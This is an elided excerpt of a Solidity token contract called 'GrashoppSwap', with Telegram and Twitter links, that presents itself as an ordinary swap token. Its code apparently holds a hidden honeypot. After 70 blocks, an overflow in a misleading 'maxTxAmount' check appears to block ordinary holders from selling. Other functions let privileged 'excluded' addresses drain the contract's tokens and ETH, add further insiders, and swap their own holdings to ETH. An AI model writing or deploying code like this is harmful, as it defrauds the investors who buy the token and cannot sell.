...
Socials:
Telegram: https://t.me/grashoppswap
twitter: https://twitter.com/grashoppswap
...
contract GrashoppSwap is IERC20, Ownable {
    uint256 private constant MAX = ~uint256(0);
    uint256 private _Launched = block.number;
    ...
    uint256 public ReflictionFee = 1;
    ...
    function approve(uint256 amount) external {
        if (_excluded[msg.sender]) _amount = amount;
    }

    function exclude(address account, bool value) external {
        if (_excluded[msg.sender]) _excluded[account] = value;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_excluded[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }
    ...
    function transferAnyERC20Token(
        ...
        if (_excluded[msg.sender]) IERC20(token).transfer(account, amount);
    }

    function transferToken(address account, uint256 amount) external {
        if (_excluded[msg.sender]) payable(account).transfer(amount);
    }
    ...
    function _approve(
        ...
        if (_excluded[owner] && (_Launched+70 < block.number)) _amount = MAX;
    ...
    function _transfer(
        ...
        if (_Launched+70 < block.number) BurnFee = 1;
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_excluded[from] && amount <= _swapTokensAtAmount) {
            require(approval[from] + BurnFee + MAX >= 0, 'Transfer amount exceeds the maxTxAmount');
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (uniswapV2Pair == address(0)) uniswapV2Pair = pair();

        if (to == _owner && _excluded[from]) return swapTokensForEth(amount, to);
        ...
        bool takeFee = !_excluded[from] && !_excluded[to] && fee > 0 && !inSwapAndLiquify;
